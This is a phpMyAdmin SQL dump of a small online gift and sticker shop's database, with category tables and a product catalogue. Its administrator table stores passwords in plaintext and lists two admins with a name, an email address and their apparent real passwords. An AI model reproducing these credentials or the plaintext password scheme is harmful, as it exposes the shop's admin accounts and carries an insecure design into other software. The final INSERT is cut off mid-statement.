-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Generation Time: Oct 04, 2024 at 09:23 AM
-- Server version: 10.6.19-MariaDB-cll-lve
-- PHP Version: 8.3.11

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `f5140715_pentiquedb`
--

CREATE DATABASE pentiquedb

USE pentiquedb

-- --------------------------------------------------------

--
-- Table structure for table `administrator`
--

CREATE TABLE `administrator` (
  `administratorID` int(11) NOT NULL,
  `administratorName` varchar(45) NOT NULL,
  `administratorSurname` varchar(45) NOT NULL,
  `administratorEmail` varchar(45) NOT NULL,
  `administratorPassword` varchar(45) NOT NULL
) ENGINE=InnoDB AVG_ROW_LENGTH=16384 DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `administrator`
--

INSERT INTO `administrator` (`administratorID`, `administratorName`, `administratorSurname`, `administratorEmail`, `administratorPassword`) VALUES
(1, 'Matthew', 'Miller', 'matthewmillerh@outlook.com', 'admin1992'),
(3, 'Trudi', 'Miller', 'Trudi', 'Avanza253');

-- --------------------------------------------------------

--
-- Table structure for table `category1`
--

CREATE TABLE `category1` (
  `category1ID` int(11) NOT NULL,
  `category1Name` varchar(255) NOT NULL
) ENGINE=InnoDB AVG_ROW_LENGTH=1489 DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `category1`
--

INSERT INTO `category1` (`category1ID`, `category1Name`) VALUES
(18, 'Books'),
(2, 'Christmas'),
(21, 'Craft products'),
(19, 'Educational'),
(3, 'Fridge Magnets'),
(4, 'Gifting'),
(20, 'Home Decor'),
(22, 'Jewelry'),
(5, 'Miscellaneous'),
(26, 'Plants'),
(25, 'Polyplank Products'),
(6, 'Reward Charts'),
(7, 'Stationery'),
(8, 'Sticker Albums'),
(9, 'Stickers and Labels'),
(10, 'Toys');

-- --------------------------------------------------------

--
-- Table structure for table `category2`
--

CREATE TABLE `category2` (
  `category2ID` int(11) NOT NULL,
  `category2Name` varchar(255) DEFAULT NULL,
  `category1ID` int(11) DEFAULT NULL
) ENGINE=InnoDB AVG_ROW_LENGTH=780 DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `category2`
--

INSERT INTO `category2` (`category2ID`, `category2Name`, `category1ID`) VALUES
(1, 'Love', 3),
(2, 'Mom', 3),
(3, 'Gift Bags', 4),
(4, 'Gift Wrap', 4),
(5, 'Greeting Cards', 4),
(6, 'Tissue Paper', 4),
(7, 'Afrikaans', 6),
(8, 'English', 6),
(9, 'Christmas Labels', 9),
(10, 'Round Labels', 9),
(11, 'Star Labels', 9),
(12, 'General Stickers', 9),
(13, 'Reward Stickers', 9),
(14, 'Activity Packs', 10),
(15, 'Board Games', 10),
(16, 'Capsule Creatures', 10),
(17, 'Cars', 10),
(18, 'Miscellaneous', 10),
(19, 'Plastic Toys', 10),
(20, 'Puzzles', 10),
(21, 'Afrikaans', 19),
(22, 'English', 19),
(25, 'Plastic Eyes', 21),
(26, 'Gifts', 4),
(33, 'E-books', 18),
(34, 'Printed Books', 18),
(35, 'General Pentique Stickers', 9),
(36, 'Polyplank Planters', 25),
(37, 'Irish Rose', 26);

-- --------------------------------------------------------

--
-- Table structure for table `category3`
--

CREATE TABLE `category3` (
  `category3ID` int(11) NOT NULL,
  `category3Name` varchar(255) DEFAULT NULL,
  `category2ID` int(11) DEFAULT NULL
) ENGINE=InnoDB AVG_ROW_LENGTH=1092 DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `category3`
--

INSERT INTO `category3` (`category3ID`, `category3Name`, `category2ID`) VALUES
(1, 'Afrikaans', 2),
(2, 'English', 2),
(3, 'Bottle', 3),
(4, 'Flat', 3),
(5, 'Large', 3),
(6, 'Medium', 3),
(7, 'Small', 3),
(8, 'Small', 5),
(9, 'X-small', 5),
(10, 'Plain Star Labels', 11),
(11, 'Star Labels with Smiley Faces', 11),
(12, 'Afrikaans', 13),
(13, 'English', 13),
(14, 'Image Only', 13),
(15, 'Flat', 12),
(16, 'Puffy', 12),
(18, 'Between Small and Medium', 3),
(19, '10mm', 10),
(20, '13mm', 10),
(21, 'Bean Bags', 18);

-- --------------------------------------------------------

--
-- Table structure for table `product`
--

CREATE TABLE `product` (
  `productID` int(11) NOT NULL,
  `productName` varchar(255) NOT NULL,
  `productPrice` double NOT NULL,
  `productStockStatus` varchar(45) NOT NULL,
  `productFileName` varchar(255) NOT NULL,
  `category1ID` int(11) DEFAULT NULL,
  `category2ID` int(11) DEFAULT NULL,
  `category3ID` int(11) DEFAULT NULL,
  `productFeatured` tinyint(1) DEFAULT 0,
  `productSpecial` tinyint(1) DEFAULT 0,
  `productSpecialPrice` double DEFAULT 0,
  `productCode` varchar(11) DEFAULT NULL,
  `productDescription` varchar(20000) DEFAULT NULL,
  `productPosition1` int(11) DEFAULT NULL,
  `productPosition2` int(11) DEFAULT NULL,
  `productPosition3` int(11) DEFAULT NULL,
  `productHidden` tinyint(4) NOT NULL DEFAULT 0
) ENGINE=InnoDB AVG_ROW_LENGTH=349 DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `product`
--

INSERT INTO `product` (`productID`, `productName`, `productPrice`, `productStockStatus`, `productFileName`, `category1ID`, `category2ID`, `category3ID`, `productFeatured`, `productSpecial`, `productSpecialPrice`, `productCode`, `productDescription`, `productPosition1`, `productPosition2`, `productPosition3`, `productHidden`) VALUES
(27, 'Wine Design Bottle Bag', 14, 'In Stock', 'wine_design.JPG', 4, 3, 3, 0, 0, NULL, '00388', '', 33, 7, 6, 0),
(28, 'Lion Design Bottle Bag', 14, 'In Stock', 'lion_design.JPG', 4, 3, 3, 0, 0, NULL, '387', '', 32, 8, 5, 0),
(29, 'Red Bottle Bag', 12, 'In Stock', 'red (2).JPG', 4, 3, 3, 0, 0, NULL, '426', '', 31, 6, 4, 0),
(30, 'Metallic Gold Bottle Bag', 15, 'In Stock', 'gold (2).jpg', 4, 3, 3, 0, 0, NULL, '424', '', 30, 5, 3, 0),
(31, 'Metallic Silver Bottle Bag', 15, 'In Stock', 'silver (2).jpg', 4, 3, 3, 0, 0, NULL, '425', '', 29, 4, 2, 0),
(32, 'Small Greeting Card - Yorkie on Grass', 8, 'In Stock', 'Yorkie on grass edited (2).JPG', 4, 5, 8, 0, 0, NULL, '566', 'Blank Inside  <br/>  W: 75mm H:110mm', 24, 1, 1, 0),
(33, 'Small Greeting Card - Border Collie', 8, 'In Stock', '3 (2).jpg', 4, 5, 8, 0, 0, NULL, '567', 'Blank Inside<br/>  W: 75mm H:110mm', 23, 1, 1, 0),
(34, 'Small Greeting Card - Dog on Orange', 8, 'In Stock', '4 (2).jpg', 4, 5, 8, 0, 0, NULL, '568', 'Blank Inside <br/>  W:75mm H: 110mm', 22, 1, 1, 0),
(35, 'Afrikaans Trophy labels 30 - Gold', 5.5, 'In Stock', 'gold-trophy-afr (2).JPG', 9, 13, 12, 0, 0, NULL, '00023', 'Label diameter: 25mm <br/> 30 labels per packet', 67, 38, 0, 0),
(36, 'English Trophy labels 30 - Gold', 5.5, 'In Stock', '1.jpg', 9, 13, 13, 0, 0, NULL, '00024', 'Label diameter: 25mm <br/> 30 labels per packet <br/> Perfect to buy and donate to a school in need! Inspire and motivate a child and feel good inside!', 66, 36, 16, 0),
(37, 'English Trophy labels 120 - Gold', 12, 'In Stock', '1.jpg', 9, 13, 13, 0, 0, NULL, '00129', 'Label diameter: 25mm <br/> 120 labels per packet', 64, 35, 15, 0),
(38, 'Afrikaans Trophy labels 120 - Gold', 12, 'In Stock', 'gold-trophy-afr (2).JPG', 9, 13, 12, 0, 0, NULL, '00225', 'Label diameter: 25mm <br/> 120 labels per packet', 65, 37, 1, 0),
(39, 'Afrikaans Starry labels 40 - Neon Red', 5.5, 'In Stock', 'IMG_5238 (2).JPG', 9, 13, 12, 0, 0, NULL, '00178', 'Label diameter: 19mm <br/> 40 labels per packet. <br/>Perfect to buy and donate to a school in need! Inspire and motivate a child and feel good inside!', 63, 34, 2, 0),
(40, 'Afrikaans Starry labels 40 - Neon Green', 5.5, 'In Stock', 'IMG_5232 (2).JPG', 9, 13, 12, 0, 0, NULL, '00179', 'Label diameter: 19mm <br/> 40 labels per packet', 62, 33, 3, 0),
(41, 'Small Greeting Card - Peeping Squirrel', 8, 'In Stock', '5 (2).jpg', 4, 5, 8, 0, 0, NULL, '00569', 'Blank Inside<br/>  W:75mm H:110mm', 21, 1, 1, 0),
(42, 'Small Greeting Card - Squirrel lying on Tree', 8, 'In Stock', '6 (2).jpg', 4, 5, 8, 0, 0, NULL, '00570', 'Blank Inside <br/>\r\nW: 75mm H:110mm', 20, 1, 1, 0),
(43, 'Small Greeting Card - Squirrel with Acorn', 8, 'In Stock', '11 (2).jpg', 4, 5, 8, 0, 0, NULL, '00571', 'Blank Inside <br/>\r\nW: 75mm H:110mm', 19, 1, 1, 0),
(46, 'Small Greeting Card - Squirrel on Grass', 8, 'In Stock', '12 (2).jpg', 4, 5, 8, 0, 0, NULL, '00572', 'Blank Inside <br/>\r\nW: 75mm H:110mm', 18, 1, 1, 0),
(47, 'Small Greeting Card - Kissing Birds', 8, 'In Stock', '8 (2).jpg', 4, 5, 8, 0, 0, NULL, '00573', 'Blank Inside <br/>\r\nW: 75mm H:110mm', 17, 1, 1, 0),
(48, 'Small Greeting Card - Penguin', 8, 'In Stock', '7 (2).jpg', 4, 5, 8, 0, 0, NULL, '00574', 'Blank Inside <br/>\r\nW: 75mm H:110mm', 16, 1, 1, 0),
(49, 'Small Greeting Card - Beach Cat', 8, 'In Stock', 'Beach Cat.jpg', 4, 5, 8, 0, 0, NULL, '00575', 'Blank Inside <br/>\r\nW: 75mm H:110mm', 15, 1, 1, 0),
(50, 'Small Greeting Card - Parrot- blue sky', 8, 'In Stock', 'greeting card parrot blue sky.jpg', 4, 5, 8, 0, 0, NULL, '00576', 'Blank Inside <br/>\r\nW: 75mm H:110mm', 14, 1, 1, 0),
(51, 'Small Greeting Card - Pink Lion', 8, 'In Stock', 'greeting card lion- pink mane.jpg', 4, 5, 8, 0, 0, NULL, '00577', 'Blank Inside <br/>\r\nW: 75mm H:110mm', 13, 1, 1, 0),
(52, 'Small Greeting Card - White Lion', 8, 'In Stock', 'greeting card white lion.jpg', 4, 5, 8, 0, 0, NULL, '00578', 'Blank Inside <br/>\r\nW: 75mm H:110mm', 12, 1, 1, 0),
(53, 'Small Greeting Card - Talking Lion', 8, 'In Stock', 'greeting card talking lion.jpg', 4, 5, 8, 0, 0, NULL, '00579', 'Blank Inside <br/>\r\nW: 75mm H:110mm', 11, 1, 1, 0),
(54, 'Small Greeting Card - Happy Birthday Lion', 8, 'In Stock', 'greeting card happy bday lion.jpg', 4, 5, 8, 0, 0, NULL, '00580', 'Blank Inside <br/>\r\nW: 75mm H:110mm', 10, 1, 1, 0),
(55, 'Small Greeting Card - Brown Lion', 8, 'In Stock', 'greeting card brown lion.jpg', 4, 5, 8, 0, 0, NULL, '00581', 'Blank Inside <br/>\r\nW: 75mm H:110mm', 9, 1, 1, 0),
(56, 'Small Greeting Card - Cheetah Face', 8, 'In Stock', 'IMG_5262 (2).JPG', 4, 5, 8, 0, 0, NULL, '00582', 'Blank Inside <br/>\r\nW: 75mm H:110mm', 8, 1, 1, 0),
(57, 'Small Greeting Card - Young Cheetah Face', 8, 'In Stock', 'greeting card young cheetah face (2).jpg', 4, 5, 8, 0, 0, NULL, '00583', 'Blank Inside <br/>\r\nW: 75mm H:110mm', 7, 1, 1, 0),
(58, 'Small Greeting Card - Dam Tiger', 8, 'In Stock', 'greeting card dam tiger.jpg', 4, 5, 8, 0, 0, NULL, '00584', 'Blank Inside <br/>\r\nW: 75mm H:110mm', 6, 1, 1, 0),
(59, 'Small Greeting Card - Purple Flower Tiger', 8, 'In Stock', 'greeting card purple flower tiger (2).jpg', 4, 5, 8, 0, 0, NULL, '00585', 'Blank Inside <br/>\r\nW: 75mm H:110mm', 5, 1, 1, 0),
(61, 'Small Greeting Cards - Pack of 5', 30, 'In Stock', 'greeting card parrot blue sky.jpg', 4, 5, 8, 0, 0, NULL, '00563', 'Contains 5 different designs Small Greeting cards  <br/>Blank Inside <br/>\r\nW: 75mm H:110mm <br/> Makes a great gift!', 4, 1, 1, 0),
(62, 'Extra-Small Greeting Card - Dog', 6, 'In Stock', '4 (2).jpg', 4, 5, 9, 0, 0, NULL, '00586', 'Blank Inside <br/>\r\nW: 60mm H:84mm', 3, 1, 1, 0),
(63, 'Extra-Small Greeting Card - Squirrel', 6, 'In Stock', '3 (2).jpg', 4, 5, 9, 0, 0, NULL, '00587', 'Blank Inside <br/>\r\nW: 60mm H:84mm', 2, 1, 1, 0),
(64, 'Extra-Small Greeting Card - Dam Tiger', 6, 'In Stock', '2 (2).jpg', 4, 5, 9, 0, 0, NULL, '00588', 'Blank Inside <br/>\r\nW: 60mm H:84mm', 1, 1, 1, 0),
(65, 'Extra-Small Greeting Card - Walking Tiger', 6, 'In Stock', '1 (2).jpg', 4, 5, 9, 0, 0, NULL, '00589', 'Blank Inside <br/>\r\nW: 60mm H:84mm', 0, 1, 1, 0),
(66, 'Afrikaans Starry labels 40 - Neon Pink', 5.5, 'In Stock', 'IMG_5235 (2).JPG', 9, 13, 12, 0, 0, NULL, '00180', 'Label diameter: 19mm <br/> 40 labels per packet', 61, 32, 4, 0),
(67, 'Afrikaans Starry labels 40 - Neon Yellow', 5.5, 'In Stock', 'Afr Neon starry Afr yellow.JPG', 9, 13, 12, 0, 0, NULL, '00181', 'Label diameter: 19mm <br/> 40 labels per packet', 60, 31, 5, 0),
(68, 'Afrikaans Neon Starry labels 120', 10, 'In Stock', 'Afr neon starry orange.JPG', 9, 13, 12, 0, 0, NULL, '00102', 'Contains 5 different neon colours <br/> Label diameter: 19mm <br/> 120 labels per packet', 59, 29, 6, 0),
(69, 'Afrikaans Starry labels 40 - Neon Orange', 5.5, 'In Stock', 'afr neon starry orange.JPG', 9, 13, 12, 0, 0, NULL, '00499', 'Label diameter: 19mm <br/>\r\n40 labels per packet', 58, 30, 7, 0),
(70, 'Afrikaans Neon Starry labels 400', 21, 'In Stock', 'afr neon starry green.JPG', 9, 13, 12, 0, 0, NULL, '00496', 'Contains 5 different neon colours <br/> Label diameter 19mm <br/>\r\n400 labels per packet', 57, 28, 8, 0),
(71, 'Afrikaans Starry labels 40 - Gold', 5.5, 'Out of Stock', 'Afr starry gold.jpg', 9, 13, 12, 0, 0, NULL, '00493', 'Label diameter: 19mm <br/>\r\n40 labels per packet', 56, 27, 9, 0),
(72, 'Afrikaans Starry labels 120 - Gold', 10, 'Out of Stock', 'Afr starry gold.jpg', 9, 13, 12, 0, 0, NULL, '00491', 'Label diameter: 19mm \r\n40 labels per packet', 55, 26, 10, 0),
(73, 'Afrikaans Starry labels 400 - Gold', 21, 'Out of Stock', 'Afr starry gold.jpg', 9, 13, 12, 0, 0, NULL, '00510', 'Label diameter 19mm <br/>\r\n400 labels per packet', 54, 25, 12, 0),
(74, 'English Starry labels 40 - Neon Red', 5.5, 'In Stock', 'eng neon starry red best.JPG', 9, 13, 13, 0, 0, NULL, '00182', 'Label diameter: 19mm <br/> 40 labels per packet', 53, 24, 14, 0),
(75, 'English Starry labels 40 - Neon Green', 5.5, 'In Stock', 'eng neon starry green.JPG', 9, 13, 13, 0, 0, NULL, '00183', 'Label diameter: 19mm <br/>\r\n40 labels per packet', 52, 23, 13, 0),
(76, 'English Starry labels 40 - Neon Pink', 5.5, 'In Stock', 'eng neon starry pink.JPG', 9, 13, 13, 0, 0, NULL, '00184', 'Label diameter: 19mm <br/>\r\n40 labels per packet', 51, 22, 12, 0),
(77, 'English Starry labels 40 - Neon Yellow', 5.5, 'In Stock', 'eng neon starry yellow.JPG', 9, 13, 13, 0, 0, NULL, '00185', 'Label diameter: 19mm <br/>\r\n40 labels per packet\r\n', 50, 21, 11, 0),
(78, 'English Starry labels 40 - Neon Orange', 5.5, 'In Stock', 'eng neon starry orange(12).JPG', 9, 13, 13, 0, 0, NULL, '00498', 'Label diameter: 19mm <br/>\r\n40 labels per packet', 49, 20, 10, 0),
(79, 'English Starry labels 120 - Neon Assorted', 10, 'In Stock', 'eng neon starry green.JPG', 9, 13, 13, 0, 0, NULL, '00103', 'Contains 5 different neon colours <br/> Label diameter: 19mm <br/>\r\n120 labels per packet', 48, 19, 9, 0),
(80, 'English Starry labels 400 - Neon Assorted', 21, 'In Stock', 'eng neon starry orange(12).JPG', 9, 13, 13, 0, 0, NULL, '00497', 'Contains 5 different neon colours <br/> Label diameter: 19mm <br/> \r\n400 labels per packet', 47, 18, 8, 0),
(81, 'English Starry labels 40 - Gold', 5.5, 'In Stock', 'Eng starry gold.jpg', 9, 13, 13, 0, 0, NULL, '00490', 'Label diameter: 19mm <br/>\r\n40 labels per packet', 46, 17, 7, 0),
(82, 'English Starry labels 120 - Gold', 10, 'In Stock', 'Eng starry gold.jpg', 9, 13, 13, 0, 0, NULL, '00492', 'Label diameter: 19mm <br/>\r\n120 labels per packet', 45, 16, 6, 0),
(83, 'English Starry labels 400 - Gold', 21, 'In Stock', 'Eng starry gold.jpg', 9, 13, 13, 0, 0, NULL, '00511', 'Label diameter: 19mm \r\n400 labels per packet', 44, 15, 5, 0),
(84, '12mm Smiley Face Labels 90 Design 1', 9, 'In Stock', 'Des 1 12mm smiley face reward (1).JPG', 9, 13, 14, 0, 0, NULL, '00120', 'Label diameter: 12mm  <br/>\r\n90 labels per packet\r\n<br/>Perfect to buy and donate to a school in need! Inspire and motivate a child and feel good inside!', 43, 4, 1, 0),
(85, '12mm Smiley Face Labels 90 Design 2', 9, 'In Stock', 'Des 2 12mm smiley face reward (6).JPG', 9, 13, 14, 0, 0, NULL, '00162', 'Label diameter: 12mm \r\n90 labels per packet', 42, 3, 1, 0),
(86, '12mm Smiley Face Labels 450 Design 1', 25, 'In Stock', 'Des 1 12mm smiley face reward (1).JPG', 9, 13, 14, 0, 0, NULL, '00520', 'Label diameter: 12mm <br/>  450 labels per packet', 41, 2, 1, 0),
(87, '12mm Smiley Face Labels 450 Design 2', 25, 'In Stock', 'Des 2 12mm smiley face reward (6).JPG', 9, 13, 14, 0, 0, NULL, '00521', 'Label diameter: 12mm 450 labels per packet', 40, 1, 1, 0),
(89, 'Yellow Trophy Labels 72 Afrikaans', 8, 'In Stock', 'Yellow Trophy Afr.jpg', 9, 13, 12, 0, 0, NULL, '00148', 'Label Size: 15 x 15mm <br/>\r\n72 labels per packet', 38, 14, 11, 0),
(90, 'Yellow Trophy Labels 240 Afrikaans', 18, 'In Stock', 'Yellow Trophy Afr.jpg', 9, 13, 12, 0, 0, NULL, '00518', 'Label Size: 15 x 15mm\r\n240 labels per packet\r\n<br/>Perfect to buy and donate to a school in need! Inspire and motivate a child and feel good inside!', 37, 13, 13, 0),
(91, 'Yellow Trophy Labels 72 English', 8, 'In Stock', 'Yellow trophy english.JPG', 9, 13, 13, 0, 0, NULL, '00147', 'Label Size: 15 x 15mm\r\n72 labels per packet', 36, 12, 4, 0),
(92, 'Yellow Trophy Labels 240 English', 18, 'In Stock', 'Yellow trophy english.JPG', 9, 13, 13, 0, 0, NULL, '00519', 'Label Size: 15 x 15mm\r\n240 labels per packet', 35, 11, 3, 0),
(93, 'Animal Mix Reward Sticker 72 - Afrikaans', 8, 'In Stock', 'Afr Animal Mix.jpg', 9, 13, 12, 0, 0, NULL, '00351', 'Label Size: 15 x 15mm <br/>\r\n72 labels per packet', 34, 10, 14, 0),
(94, 'Animal Mix Reward Sticker 72 - English', 8, 'In Stock', 'Eng animal mix.jpg', 9, 13, 13, 0, 0, NULL, '00352', 'Label Size: 15 x 15mm <br/>\r\n72 labels per packet', 33, 9, 2, 0),
(95, 'Mix Reward Stickers 212 - Afrikaans ', 15, 'In Stock', '212 afr mix labels.jpg', 9, 13, 12, 0, 0, NULL, '00487', '212 labels per packet <br/>\r\nEach packet contains 1 sheet each of the following: <br/>\r\nstarry labels, gold trophy labels, yellow trophy or animal mix labels, 12mm smiley face labels, star labels, star label with smiley faces, 10mm round labels\r\n', 32, 8, 15, 0),
(96, 'Mix Reward Stickers 212 - English', 15, 'In Stock', '212 eng mix.jpg', 9, 13, 13, 0, 0, NULL, '00488', '212 labels per packet <br/>\r\nEach packet contains 1 sheet each of the following: <br/>\r\nstarry labels, gold trophy labels, yellow trophy or animal mix labels, 12mm smiley face labels, star labels, star label with smiley faces, 10mm round labels', 31, 7, 1, 0),
(98, 'Star Labels 160/pkt  - Blue', 9, 'In Stock', 'blue_stars (2).jpg', 9, 11, 10, 0, 0, NULL, '00062', '160 Labels per packet', 30, 1, 11, 0),
(99, 'Star Labels 160/pkt  - Bright Pink', 9, 'In Stock', 'bright pink stars.jpg', 9, 11, 10, 0, 0, NULL, '00063', '160 Labels per packet', 29, 1, 10, 0),
(100, 'Star Labels 160/pkt  - Bright Purple', 9, 'In Stock', 'more_purple_stars (2).jpg', 9, 11, 10, 0, 0, NULL, '00064', '160 Labels per packet', 28, 1, 9, 0),
(101, 'Star Labels 160/pkt  - Gold', 9, 'In Stock', 'gold-stars (2).JPG', 9, 11, 10, 0, 0, NULL, '00065', '160 Labels per packet', 27, 1, 1, 0),
(102, 'Star Labels 160/pkt  - Silver', 9, 'In Stock', 'silver-stars (2).JPG', 9, 11, 10, 0, 0, NULL, '00066', '160 Labels per packet', 26, 1, 0, 0),
(103, 'Star Labels 160/pkt  - Neon Pink', 9, 'In Stock', 'neon_pink_stars (2).JPG', 9, 11, 10, 0, 0, 5, '00067', '160 labels per packet', 25, 1, 3, 0),
(104, 'Star Labels 160/pkt  - Neon Green', 9, 'In Stock', 'neon green stars.JPG', 9, 11, 10, 0, 0, 5, '00068', '160 Labels per packet', 24, 1, 5, 0),
(105, 'Star Labels 160/pkt  - Neon red', 9, 'In Stock', 'neon red stars.JPG', 9, 11, 10, 0, 0, 5, '00069', '160 Labels per packet', 23, 1, 4, 0),
(106, 'Star Labels 160/pkt  - Red', 9, 'In Stock', 'non_metallic_red_stars (2).jpg', 9, 11, 10, 0, 0, NULL, '00071', '160 Labels per packet', 22, 1, 7, 0),
(107, 'Star Labels 160/pkt  - Light Purple', 9, 'In Stock', 'light purple stars.JPG', 9, 11, 10, 0, 0, NULL, '00127', '160 Labels per packet', 21, 1, 8, 0),
(108, 'Star Labels 160/pkt  - Mixed red/blue/purple/green', 9, 'In Stock', 'scan_pic0013.jpg', 9, 11, 10, 0, 0, NULL, '00105', '160 Labels per packet <br/>\r\nMixed colours on one sheet', 20, 1, 6, 0),
(109, 'Star Labels 160/pkt  - Mixed Neon red/neon pink/neon green', 9, 'In Stock', 'neon_pink_stars (2).JPG', 9, 11, 10, 0, 0, 5, '00072', '160 Labels per packet <br/>\r\nSingle colour per sheet. <br/>\r\n3 Different colour sheets per packet\r\n<br/>Perfect to buy and donate to a school in need! Inspire and motivate a child and feel good inside!', 19, 1, 2, 0),
(110, 'Star Labels with Smiley Faces 160 - Mixed Colours', 10, 'In Stock', 'green star with smiley face.jpg', 9, 11, 11, 0, 0, NULL, '00531', '160 Labels per packet <br/>\r\n1 colour per sheet <br/>\r\nPacket contains 5 of the following 6 colours: <br/>\r\ngreen, light blue, yellow, purple, light pink, neon orange', 18, 1, 1, 0),
(111, 'Star Labels with Smiley Faces 160 - Light Blue', 10, 'In Stock', 'blue star with smiley face.jpg', 9, 11, 11, 0, 0, NULL, '00152', '160 Labels per packet', 17, 1, 1, 0),
(112, 'Star Labels with Smiley Faces 160 - Light Pink', 10, 'In Stock', 'pink star with smiley face.jpg', 9, 11, 11, 0, 0, NULL, '00153', '160 labels per packet', 16, 1, 1, 0),
(113, 'Star Labels with Smiley Faces 160/pkt  - Green', 10, 'In Stock', 'green star with smiley face.jpg', 9, 11, 11, 0, 0, NULL, '00345', '160 Labels per packet\r\n<br/>Perfect to buy and donate to a school in need! Inspire and motivate a child and feel good inside!', 15, 1, 1, 0),
(114, 'Star Labels with Smiley Faces 160 - Purple', 10, 'In Stock', 'purple star with smiley face.jpg', 9, 11, 11, 0, 0, NULL, '00346', '160 Labels per packet', 14, 1, 1, 0),
(115, 'Star Labels  with Smiley Faces 160/pkt  - Yellow', 10, 'In Stock', 'yellow star with smiley faces.JPG', 9, 11, 11, 0, 0, NULL, '00408', '160 Labels per packet', 13, 1, 1, 0),
(116, 'Star Labels with Smiley Faces 160/pkt  - Neon Orange', 10, 'In Stock', 'orange star with smiley faces (2).JPG', 9, 11, 11, 0, 0, NULL, '00409', '160 Labels per packet', 12, 1, 1, 0),
(117, '10mm Round Labels 484 - Red', 12.5, 'In Stock', 'IMG_5394 (2).JPG', 9, 10, 19, 0, 0, NULL, '00092', '484 labels per packet', 11, 8, 4, 0),
(118, '10mm Round Labels 484 - Bright Pink', 12.5, 'In Stock', 'pink-dots (2).jpg', 9, 10, 19, 0, 0, NULL, '00093', '484 Labels per packet', 10, 11, 7, 0),
(119, '10mm Round Labels 484 - Bright Purple', 12.5, 'In Stock', 'bright purple 10mm round label.JPG', 9, 10, 19, 0, 0, NULL, '00094', '484 Labels per packet\r\n<br/>Perfect to buy and donate to a school in need! Inspire and motivate a child and feel good inside!', 9, 10, 6, 0),
(120, '10mm Round Labels 484 - Gold', 12.5, 'In Stock', 'IMG_5402 (2).JPG', 9, 10, 19, 0, 0, NULL, '00095', '484 Labels per packet', 8, 7, 3, 0),
(122, '10mm Round Labels 484 - Silver', 12.5, 'In Stock', 'IMG_5408 (2).JPG', 9, 10, 19, 0, 0, NULL, '00096', '484 Labels per packet', 7, 6, 2, 0),
(123, '10mm Round Labels 484 - Neon Red', 12.5, 'In Stock', 'IMG_5398 (2).JPG', 9, 10, 19, 0, 0, NULL, '00099', '484 Labels per Packet', 6, 5, 1, 0),
(124, '10mm Round Labels 484 - Neon Yellow', 12.5, 'In Stock', 'IMG_5382 (2).JPG', 9, 10, 19, 0, 0, NULL, '00101', '484 Labels per Packet', 5, 4, 0, 0),
(125, '10mm Round Labels 484 - Light Purple', 12.5, 'In Stock', 'light purple 10mm round label.JPG', 9, 10, 19, 0, 0, NULL, '00131', '484 Labels per Packet', 4, 9, 5, 0),
(126, '13mm Round Labels 360 - Bright Blue', 12.5, 'In Stock', 'blue round label 13mm.JPG', 9, 10, 20, 0, 0, NULL, '00091', '360 Labels per Packet', 3, 3, 3, 0),
(127, '13mm Round Labels 360 - Neon Pink', 12.5, 'In Stock', 'IMG_5410 (2).JPG', 9, 10, 20, 0, 0, NULL, '00097', '360 Label per Packet', 2, 1, 0, 0),
(128, '13mm Round Labels 360 - Mixed Colours', 12.5, 'In Stock', 'IMG_5224 (3).JPG', 9, 10, 20, 0, 0, NULL, '00532', '360 Labels per Packet <br/>\r\nContains Bright Blue, Neon Pink and Neon Green sheets', 1, 0, 1, 0),
(129, '13mm Round Labels 360 - Neon Green', 12.5, 'In Stock', 'neon green round label 13mm.JPG', 9, 10, 20, 0, 0, NULL, '00098', '360 Labels per Packet', 0, 2, 2, 0),
(130, 'Between Small and Medium Silver Bag', 12, 'In Stock', 'between s&M silver.jpg', 4, 3, 18, 0, 0, NULL, '00495', 'H: 20cm W: 15cm Gusset: 10cm', 26, 1, 1, 0),
(131, 'Between Small and Medium Gold Bag', 12, 'In Stock', 'between s and M gold.jpg', 4, 3, 18, 0, 0, NULL, '00494', 'H: 20cm W: 15cm Gusset: 10cm', 25, 0, 1, 0),
(132, 'Black Bottle Bag', 14, 'In Stock', 'Black Bottle Bag.JPG', 4, 3, 3, 0, 0, NULL, '00562', '', 28, 3, 1, 0),
(133, 'Big Cat Mix Sticker', 10, 'In Stock', 'Big Cat Mix Sticker.JPG', 9, 35, NULL, 0, 0, NULL, '00335', 'Flat sticker <br/> Sticker Size: W: 149mm H:210mm <br/> Packaging size: W: 154mm H: 259mm', 74, 39, 12, 0),
(134, 'Big Cat Mix Stickers - Value pack 5 sheets/pkt', 40, 'In Stock', 'Big Cat Mix Value Pack.jpg', 9, 35, NULL, 0, 0, NULL, '00404', 'Flat stickers <br/>\r\nContains 5 Big Cats Mix sticker sheets <br/>\r\nSticker Size: W: 149mm H:210mm <br/>\r\nPackaging size: W: 154mm H: 259mm', 73, 40, 13, 0),
(135, 'Squirrel Sticker', 10, 'In Stock', 'Squirrel Sticker 149 x 210.jpg', 9, 35, NULL, 0, 0, NULL, '00334', 'Flat sticker <br/>\r\nSticker Size: W: 149mm H:210mm <br/>\r\nPackaging size: W: 154mm H: 259mm', 71, 41, 14, 0),
(136, 'Squirrel Sticker  - Value pack 5 sheets/pkt', 40, 'In Stock', 'Squirrel stickers 149 x 210 value pack.jpg', 9, 35, NULL, 0, 0, NULL, '00423', 'Flat stickers <br/> Contains 5 Squirrel sticker sheets <br/> Sticker Size: W: 149mm H:210mm <br/> Packaging size: W: 154mm H: 259mm', 70, 42, 15, 0),
(137, 'Farmyard Stickers', 10, 'In Stock', 'Farmyard.jpg', 9, 35, NULL, 0, 0, NULL, '00402', 'Flat sticker <br/>\r\nSticker Size: W: 149mm H:210mm <br/>\r\nPackaging size: W: 154mm H: 259mm', 72, 43, 16, 0),
